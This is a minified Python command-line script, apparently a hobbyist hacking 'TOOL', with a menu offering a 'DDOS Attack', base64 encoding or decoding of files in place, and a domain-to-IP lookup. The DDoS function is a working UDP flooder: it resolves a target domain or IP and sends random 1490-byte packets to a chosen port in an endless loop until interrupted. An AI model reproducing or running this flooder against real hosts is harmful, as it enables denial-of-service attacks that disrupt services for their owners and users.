_F='\n   >>> Exit'
_E='      <<< '
_D='         >>> Error!'
_C="\n    [Enter 'c' Or Press Ctrl+C To Exit]\n"
_B=True
_A=False
try:
	from platform import system;import os,socket,random,base64;uname=system()
	if uname=='Windows':clear='cls'
	else:clear='clear'
	os.system(clear);green='\x1b[1;32;40m';red='\x1b[1;32;31m';reset='\x1b[0;32;37m';yellow='\x1b[1;32;33m';whiteb='\x1b[1;32;37m';logo=green+"\n    _____                \n    / ____|                    \n    | |  __ _ __ ___  ___ _ __  \n    | | |_ | '__/ _ \\/ _ \\ '_ \\ \n    | |__| | | |  __/  __/ | | |\n    \\_____|_|  \\___|\\___|_| |_|\n    "+red+' \n        TOOL                      \n    '+reset;print(logo);print(reset+_C);info_org=whiteb+'\n    [@] Choice Number Plase\n    [0] For Clear Screen\n    [1] DDOS Attack\n    [2] Encode/Decode Files\n    [3] Get ip By Domain\n    '+reset;print(info_org)
	def dt():
		F="Send %s packet To '%s:%s'";G=whiteb+'\n        [@] Choice Number\n        [1] Attack Domain\n        [2] Attack Ip\n        '+reset;print(G);B=str(input(whiteb+_E+reset))
		if B=='1':
			B=str(input(whiteb+'     Enter Domain <<< '+reset))
			try:D=socket.gethostbyname(B);C=_B
			except:print(red+'            >>> Plase Enter Like This www.example.com!')
		elif B=='2':B=str(input(whiteb+'     Enter Ip <<< '+reset));D=B;C=_B
		else:print(red+'\n   >>> Not Found !');C=_A
		A=str(input(whiteb+'      Enter The Port (Port:80)  <<< '+reset))
		if A.__len__()>0:
			try:A=int(A)
			except:print(red+'         >>> Error Port (Port:80)');A=80
		else:A=80
		if C:
			H=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			if C:
				I=random._urandom(1490);E=0
				while _B:
					try:H.sendto(I,(D,A));print(green+F%(E,D,A),reset);E+=1
					except KeyboardInterrupt:os.system(clear);print(logo);print(reset+_C);print(info_org);print(green+F%(E,D,A),reset);break
					except:C=_A;print(red+'   >>> Error'+reset);break
			else:0
		else:0
	def ende():
		H='   File Path   <<< ';G='         >>> Not Found!'
		try:
			E=whiteb+'\n            [@] Choice Number\n            [1] Base64'+reset;print(E);A=str(input(whiteb+_E+reset))
			if A=='1':I='base64';B=_B
			else:print(red+G+reset);B=_A
			if B:
				E=whiteb+'\n                [@] Choice Number\n                [1] Encode\n                [2] Decode'+reset;print(E);A=str(input(whiteb+'   $2   <<< '+reset))
				if A=='1':F=_A
				elif A=='2':F=_B
				else:print(red+G+reset);B=_A
				if B:
					if F==_A:
						A=str(input(whiteb+H+reset))
						try:C=open(A,'r').read()
						except:B=_A;print(red+_D+reset)
						if B:C=base64.b64encode(C.encode());D=open(A,'wb');D.write(C);D.close();print(green+'         >>> Encoding'+reset)
					else:
						A=str(input(whiteb+H+reset))
						try:C=open(A,'rb').read()
						except:B=_A;print(red+_D+reset)
						if B:C=base64.b64decode(C);D=open(A,'wb');D.write(C);D.close();print(green+'         >>> Decoding'+reset)
		except KeyboardInterrupt:pass
	def getip():
		try:
			A=str(input(whiteb+'   Enter domain   <<< '+reset))
			try:B=socket.gethostbyname(A);print(green+f"         >>> {B}"+reset)
			except KeyboardInterrupt:pass
			except:print(red+_D+reset)
		except KeyboardInterrupt:pass
	run=_B
	while run:
		opt=str(input(yellow+' <<< '+reset))
		if opt=='1':dt()
		elif opt=='0':os.system(clear);print(logo);print(reset+_C);print(info_org)
		elif opt.lower()=='c':print(yellow+_F+reset);exit()
		elif opt=='2':ende()
		elif opt=='3':getip()
		else:print(red+'   >>> Not Found !')
except KeyboardInterrupt:print(yellow+_F+reset);exit()